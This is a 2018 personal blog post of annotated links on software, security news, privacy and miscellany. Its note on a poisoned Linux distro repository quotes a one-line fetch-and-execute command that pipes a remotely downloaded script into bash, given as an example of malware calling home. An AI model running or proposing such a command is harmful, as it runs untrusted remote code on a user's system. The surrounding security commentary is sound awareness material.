---
layout: post
title: Security, programming, and other random things from Twitter
author: quorten
date: 2018-09-24 17:48 -0500
categories: [random-software, twitter, reiterate]
tags: [random-software, twitter, reiterate]
---

Random software notes.

Another article on the history of Vim, but written from a more modern
perspective.

20180924/https://twobithistory.org/2018/08/05/where-vim-came-from.html

Very interesting!  So the thing about jumping into a Vim text editor
when you a beginner that does not yet know how to use it?  There is a
meme written about that because it happens so often.

20180924/https://stackoverflow.blog/wp-content/uploads/2017/05/meme.jpeg

"Computer programming unplugged," a more modern curriculum designed to
learn computer programming without a computer, despite the advent of
abundant low-cost computers in 2018.

20180924/https://hackaday.com/2018/08/03/computer-programming-unplugged-for-kids/

Interesting command line to synthesize music that's been around for
quite some time.

20180924/https://hackaday.com/2018/08/02/shell-script-synthesizer-knocks-your-sox-off/

Quantum computing is **not** required for an efficient recommender
system algorithm.  It is possible to compute recommendations,
i.e. Amazon and Netflix style, via the use of an efficient classical
computing algorithm.

20180924/https://www.quantamagazine.org/teenager-finds-classical-alternative-to-quantum-recommendation-algorithm-20180731/

Spectre and Meltdown security mitigations causes Google Chrome to
consume 10% more RAM.

20180924/https://www.howtogeek.com/fyi/google-chrome-will-start-using-10-more-ram-now-thanks-to-spectre/

<!-- more -->

This article tries to convince the reader that the increased RAM
consumption of web browsers a good thing that they want.  Yeah, yeah,
trying to gloss over the fact that modern programmers have gotten
lazier and less efficient, even when performing the same tasks that
were previously performed efficiently on earlier computers.

Okay, so let me explain the problem as follows.  Yes, it is true that
enabling less skilled programmers to write software will result in a
greater production of useful software.  That is good in its own right.
However, the problem in this comes down to when you try to take the
same low-skilled talent and apply that to reinvent a problem that has
already been solved before.  The result?  You'll get a less efficient,
more buggy implementation to an already solved problem, albeit using
more modern technologies.  This is a problem because when users of
these older, more efficient systems are upgrading, they will be forced
to squander some of their precious resources to literally get nothing
new, other than a back-end implementation that is written under more
politically correct antecedents.  Particularly it is a problem if the
users who are upgrading are not planning on using that system to
perform "new" tasks, but rather to focus on keeping their software
system secure and interoperable.

20180924/https://www.howtogeek.com/334594/stop-complaining-that-your-browser-uses-lots-of-ram-its-a-good-thing/

Self-taught programmers?  Don't worry, they're are just as good as
degreed ones when they qualify by other measures, to summarize.

20180924/https://www.forbes.com/sites/quora/2018/07/13/theres-good-news-for-self-taught-programmers-when-it-comes-to-job-performance/#5b6e75895b0f

Google Cloud Platform sent hash threat to delete a customer's cloud
services account if they didn't provide requested information within
three days.  The agreed problem?  Not enough human customer service
representatives.  A classic among Google, a company with a reputation
for running everything via machines and machine learning.

20180924/https://amp.businessinsider.com/google-cloud-threatens-to-automatically-delete-business-app-2018-7

An article about great skills in developers that everyone is
overlooking.  Very interesting article point!  Spending time on Reddit
and Twitter?  Is that time wasted?  Actually not.  Some of the things
you may learn that you didn't know existed from spending time on those
sites is more valuable than the things you do know.

20180924/https://medium.com/comparethemarket/everybody-is-overlooking-great-developers-lets-change-that-ddf97e408060

Very interesting!  On Unix, a fetch to a command-and-control server
can be created with one line of shell code?  Yes.

    curl -s https://[redacted]/~x|bash -&

Be careful about "user repositories" on distros as they can contain
malware.

20180924/https://nakedsecurity.sophos.com/2018/07/11/another-linux-distro-poisoned-with-malware/

So what is the licensing on the content posted to Twitter?  Well, this
is interesting.  The Twitter Terms of Service say that the author owns
their post contents, but they grant Twitter a license to reproduce it
for the sake of running Twitter services, without any expectation that
Twitter will provide compensation to the author.

Periscope I hear mentioned too?  Oh, that's some sort of TV streaming
service on behalf of Twitter.

20180925/https://twitter.com/en/tos

Don't use pattern unlock, people can easily see it and remember it,
unlike passcodes that are more difficult to see and remember.

20180925/https://gizmodo.com/for-the-love-of-all-that-is-holy-stop-using-pattern-un-1818672002

Google being reluctant to comply with search warrant, Justice
Department "goes nuclear" on them.

20180925/https://arstechnica.com/tech-policy/2017/09/justice-department-goes-nuclear-on-google-in-search-warrant-fight/

Good news, the ozone layer is coming back after decades of the
Montreal Protocol being enforced.  So we have proof that the Montreal
Protocol actually works and is not just some sort of scam.

20180925/https://arstechnica.com/science/2018/01/new-measurement-confirms-the-ozone-is-coming-back/

Intersting article on the death of microservice madness.

20180925/https://www.dwmkerr.com/the-death-of-microservice-madness-in-2018/

Very interesting ideas here.  DNSFS, an filesystem that uses Internet
protocol persistence as its means of memory.  There is a similarly
interesting concept with `pingfs`.  I must say, not too dissimilar to
the earlier ideas of using mercury delay lines for computer memory.
Take a signal and just loop it around with amplification to get
yourself some computer memory.

20180925/https://blog.benjojo.co.uk/post/dns-filesystem-true-cloud-storage-dnsfs

Ada is no longer in widespread use anymore, but luckily some of its
good ideas are being reproduced in Golang.

20180925/https://www.reddit.com/r/ada/comments/7p12n3/going_allin_with_ada_a_manifesto/

OpenCensus?  Sounds interesting, but, well, I guess it's not as
interesting as you might think from the name.

20180925/https://opensource.googleblog.com/2018/01/opencensus.html

Wow, really interesting here.  The NSA has long had voice
fingerprinting technology before its come onto the commercial scene,
and it's quality has been quite good at that.  Also, the need for
large amounts of training data has also motivated policies for
increasing phone call recording and storage.

20180925/https://theintercept.com/2018/01/19/voice-recognition-technology-nsa/

Report: 80's kids started programming at a younger age than today's
millenials.  Again, I reiterate, because this is important!  I must
admit that I am not surprised one bit at this.  The point is that the
1980's was an unusual time when kids matured faster than in the past
or the present, due to some of the social, cultural, and economic
conditions.

20180925/https://thenextweb.com/dd/2018/01/23/report-80s-kids-started-programming-at-an-earlier-age-than-todays-millennials/

Interesting article on being 9-to-5 developer, and challenges becoming
one, and viewpoints from one.

20180925/https://exceptionnotfound.net/i-am-a-9-to-5-developer-and-so-can-you/

Again, I reiterate, because this is important!  Why younger developers
don't like new programming languages.

20180925/https://www.techrepublic.com/article/heres-why-younger-developers-cant-stand-new-programming-languages/

City of Minneapolis created this new rule that most people think is
stupid and don't like: two-car per driveway limit, regardless of
length of driveway, etc.

20180925/https://jalopnik.com/stupid-minneapolis-will-fine-you-for-having-more-than-t-1822669000

Yet another article and perspective on the history of open-source
software.

20180925/https://www.engadget.com/2018/02/03/20-years-of-open-source-software/

Wow, very interesting!  A compiler that compiles C programs entirely
to ASCII text, even executable!

20180925/http://www.cs.cmu.edu/~tom7/abc/paper.pdf

High speed Internet above 100Mbps has almost no competition, even in
2016.

20180925/https://arstechnica.com/information-technology/2018/02/fcc-report-finds-almost-no-broadband-competition-at-100mbps-speeds/

Security!  Raw sockets exploit give attackers almost full control over
GNU/Linux systems.

20180925/https://arstechnica.com/information-technology/2018/02/raw-sockets-backdoor-gives-attackers-complete-control-of-some-linux-servers/

Security!  Very interesting, there was a company that FedEx bought and
retired that provided mail scanning and digitization services for an
inbox.  Although the service was no longer in modern use, there was a
AWS bucket that was made publicly available that leaked sensitive
information like passports and driver's licenses over the Internet.

20180925/https://www.theregister.co.uk/2018/02/15/fedex_aws_s3_leak/

Golang!  Wow, interesting.  Linux namespaces causing trouble with
Golang programs.

20180925/https://www.weave.works/blog/linux-namespaces-and-go-don-t-mix

Steve Wozniak no longer agrees that artificial intelligence will pose
a significant threat to human society any time soon.

20180925/https://www.cnbc.com/2018/02/23/steve-wozniak-doesnt-agree-with-elon-musk-stephen-hawking-on-a-i.html

Security!  WebUSB?  I haven't heard of that before.  Basically it is a
new Web API that allows Web applications to access USB devices.  Also
related is the fact that it creates a vulnerability/exploit against
otherwise secure smartcards.

20180925/https://www.wired.com/story/chrome-yubikey-phishing-webusb/  
20180925/https://en.wikipedia.org/wiki/WebUSB

Interesting, profiling applications with "flamegraphs."

20180925/http://brendanjryan.com/golang/profiling/2018/02/28/profiling-go-applications.html

This one is really interesting.  Someone who thought that Google would
be the best place in the world to work at, but found out that their
promotion process really didn't work for their actual observed working
conditions.  Where did they go next?  Well, they found a community
called Indie Hackers, which is pretty interesting.  Basically it is a
community of hackers who get together who have side projects.  They
choose the schedule the side project works at, and if it goes well
they can promote it to a business endeavor.

20180925/https://mtlynch.io/why-i-quit-google/

THis is interesting.  A recipe aggregating site built by the same
person.  I've got to look at it to see what the modern web devs are
doing for this applicaton.

20180930/https://mtlynch.io/ketohub-month-3/

Interesting, someone having trouble with GitHub forks locking them out
of access to a forked repo.  Why?  It was a fork of a private repo,
and when the private account owner's account got disabled, those
"permissions" inherited to the forks of it too.

20180925/https://www.niels-ole.com/ownership/2018/03/16/github-forks.html

Criticizing HTTPS Strict Transport Security.  What is the problem?
The problem is that storing a cookie to remember the strict security
setting on a local device can accumulate to a fingerprint of a user,
that can then be used to track them across the Internet.  Once they're
"logged into" the advertising network like this, they cannot control
their account to log out.

20180925/https://webkit.org/blog/8146/protecting-against-hsts-abuse/

Important!  Wow, this is really interesting.  Traits that successful
programmers can develop as kids, now?  (1) Focus, (2) collaboration,
(3) leadership, (4) emotional intelligence, (5) curiosity, (6) growth
mindset, (7) writing, (8) storytelling, (9) teaching.  Yes, as it
turns out, coding at a young age isn't really required.  Actually, to
put it more correctly and surprisingly, it doesn't really help for the
long-term career.

20180925/https://venturebeat.com/2018/03/17/9-traits-of-successful-programmers-that-kids-can-develop-now/

Flat Earth rocketeer launches himself into the sky?  Very interesting,
to the end that this is someone who kept the calculations secret, and
also that such a feat would surely require an admission that the Earth
is round.

20180925/https://gizmodo.com/at-long-last-flat-earth-rocketeer-finally-manages-to-b-1824059035

Google blocking uncertified devices from Google's proprietary Android
apps.  Also interesting here is mention that some third-party
modifications on Android phones can be quite surprising in the supply
chain.  When `arstechnica` imported a Xiaomi Redmi 3 smartphone from
China, it turned out that the importer must have opened up the box,
reflashed the phone with additional software, locked it down, sealed
it in a box again, then shipped it out.  With that treatment, they're
not too far away from packaging malware onto the phone in the
intermediary.

20180925/https://arstechnica.com/gadgets/2018/03/google-starts-blocking-uncertified-android-devices-from-logging-in/

Important!  Now, this is important.  iPhone X uses a "TrueDepth"
sensor array, which is basically an infrared dot projection
triangulation system for depth mapping near-field objects such as
selfie faces.  Does this replace more traditional 3D scanners?  No,
you said it right there.  Like all 3D scanner systems, there are
obvious limits to the 3D mapping system in the iPhone X, and only when
you are working within those limits can you get good results.
Nevertheless, this proves instrumental for "consumer-grade" use of the
technology, not to mention that face matching is bound to be much more
popular than other more generic uses.

Also interesting is that one of the demo apps, Animoji, does not
actually require the depth data to function, it runs almost entirely
off of the optical images, as evidenced by experimenting with covering
up the infrared projector versus covering up the visible light camera.

20180930/DuckDuckGo truedepth sensor array  
20180930/https://www.cultofmac.com/514225/animoji-doesnt-require-iphone-xs-truedepth-sensor/  
20180930/https://www.imore.com/how-iphone-x-camera-and-slow-sync-flash-work

Microsoft is making Windows Subsystem for Linux more advanced by
supporting multiple distributions.

20180925/https://arstechnica.com/gadgets/2018/03/microsofts-new-open-source-tool-lets-you-bring-your-own-linux-distro-to-windows/

Raspberry Pi!  Minimal Golang runtime on a Raspberry Pi without
installing a full distribution?  Yep, you've got it.

20180925/https://gokrazy.org

Security!  Security vulnerability in the `beep` command?  Yes, alas a
programming error can cause the `beep` command to be used in privilege
escalation.

20180925/https://www.bleepingcomputer.com/news/security/linux-beep-command-can-be-used-to-probe-for-the-presence-of-sensitive-files/  
20180925/https://holeybeep.ninja

Security!  Facebook and Google tracking explained, to the uninitiated.
What I must say.  The average Internet user should not be surprised
that some of these kinds of data collection are much easier and more
automatic with modern technology.  On the other hand, there is still
lots of information from people that they'd normally want in a
computer system, is easy to import, but still far displaced from the
modern ads tracking regime.

20180925/https://www.nytimes.com/2018/04/11/technology/personaltech/i-downloaded-the-information-that-facebook-has-on-me-yikes.html

Very interesting.  MySpace founder Tom Anderson?  Currently he is a
"rich nobody".  Although we might say that Facebook has clearly become
more successful than MySpace, when you look at their personal
circumstances, clearly Anderson is better off by vacationing around
the world rather than being in court like Zuckerberg.

20180925/https://theoutline.com/post/4137/myspace-tom-mark-zuckerberg-facebook

Golang!  Yes!  Now you can compile Golang to WebAssembly.

20180925/https://react-etc.net/entry/webassembly-support-lands-in-go-language-golang-wasm-js

Wow, very interesting ideas here.  What will be required to educate
people for 100-year work careers?  This is up and coming with
increasing lifespans of humans.  So, one emphasis of this article is
that people will need to accumulate actual deep knowledge, not just
know how to find things.

20180925/https://www.axios.com/next-great-workplace-challenge-100-year-careers-59d1dd4c-dc8c-4a33-b3b8-22c9336c1462.html

Yet another article about traits of highly effective people.

20180925/https://hbr.org/2018/04/7-traits-of-super-productive-people

Security!  DNS rebinding attacks, what are those?  Basically, it's
when a DNS timeout is used to cause a malicious server redirect, when
an attacker has control over a DNS server.  Now the particular problem
here that IoT devices are vulnerable to is that they are designed to
communicate directly to each other on the same local network, but
loopholes in their APIs can be used from there.  Often times, simply
better API authentication can solve most of these problems.

20180925/https://www.wired.com/story/chromecast-roku-sonos-dns-rebinding-vulnerability/  
20180925/https://en.wikipedia.org/wiki/DNS_rebinding

Food notes.  Fats + Carbs = an underestimate in the human brain about
the quantity consumed, or over-motivation to consume more.  It's a
pattern the historic human brain never encountered foraging through
nature, and basically the information overloads the brain.

20180925/https://www.nbcnews.com/health/health-news/combining-fat-carbs-overloads-brain-makes-us-overeat-n883201

Interesting!  A genetic test to see how well you can digest
carbohydrates?  Chew on a cracker for 30 seconds.  See when you can
detect it to start tasting sweet.  The sooner it happens, the better
you are at digesting carbohydrates.  Still, this is quite early
evidence and requires more study.

20180925/https://amp.businessinsider.com/cracker-test-shows-how-many-carbs-should-you-be-eating-2018-6#amp_tf=From%20%251$s

Interesting!  Habits thought to be "bad" by most people, but according
to science that can actually be healthy under some circumstances.

20180925/https://amp.businessinsider.com/bad-habits-healthy-according-to-science-2018-5

Security!  Backdoored Docker images that mined cryptocurrency.

20180925/https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/

Security!  Consumer-grade routers were at risk for some RAM-only
malware infection.

20180925/https://arstechnica.com/information-technology/2018/05/fbi-tells-router-users-to-reboot-now-to-kill-malware-infecting-500k-devices/

Sink hole at the White House and cover-up, caused by swamp, with
plenty of metaphors in the discussion to the political climiate.

20180925/https://www.washingtonpost.com/news/local/wp/2018/05/22/theres-a-sinkhole-on-the-white-house-lawn-and-its-growing/

Bitcoins protected in bunkers?  Interesting.  Xapo is a comany in
Argentina doing this for companies worldwide.

20180925/https://www.bloomberg.com/news/articles/2018-05-09/bunkers-for-the-wealthy-are-said-to-hoard-10-billion-of-bitcoin

Security!  Backdoored Python library capturing SSH credentials?  Yes,
it is `ssh-decorator`.  Apparently someone hacked access to the
library, which was the cause of this issue.

20180925/https://www.bleepingcomputer.com/news/security/backdoored-python-library-caught-stealing-ssh-credentials/

There have been debates about code of conducts cropping up in
open-source projects, with some members who protested them to resgin.
This article discusses this subject in more detail.

20180925/https://www.businessinsider.com/programmers-debate-requirements-to-behave-respectfully-ccoc-2018-5

Interesting, how to turn Vim into a word processor.

20180925/https://www.maketecheasier.com/turn-vim-word-processor/

One space or two spaces after sentences?  There was a recent
scientific study, but it's methods were still debated.  However, there
are some advantages to two spaces after sentences.  Namely, that it
provides more information, and it is easy to automatically convert
from the spaces at sentence ends to one, but the reverse process is
not so easy.

20180925/https://www.washingtonpost.com/news/speaking-of-science/wp/2018/05/04/one-space-between-each-sentence-they-said-science-just-proved-them-wrong-2/

Interesting reflection from someone who is both a runner and a coder.
Compromising between the two desires.  However, running benefits
coding, but the reverse is not true.

20180925/https://medium.com/@vanderstraeten.thomas/a-runner-paying-the-price-for-too-many-nights-of-coding-702af38b606e

7 exercise habits that are actually hurting you.

20180925/https://www.iflscience.com/health-and-medicine/17-exercise-habits-that-are-actually-hurting-you/all/

Interesting, the CIA has long been using an in-house board game to
train new employees, and now it is being published, publically
released and playable by the rest of society.

20180925/https://kotaku.com/the-cia-made-a-board-game-and-its-now-playable-1825556825

Cellphone data collection.  Why does a cellphone record locational
data at all?  It is required for 911 use.  But, also interesting here
is the policy on data resale.  There are very little safeguards
required on third party users that they secure the data properly, and
there are generally no restrictions on data resale.  Why?  There are
no laws that require this.  The last related laws were enacted around
the 1980s or so, well before the modern Internet era.

20180925/https://slate.com/technology/2018/05/locationsmart-security-it-is-totally-legal-for-cellphone-companies-to-sell-location-data-to-third-parties.html

Oh, and there's this Twitter account that contains many of the URLs
I've posted, but not quite so organized as I have reposted them.

20180925/https://twitter.com/jesselang
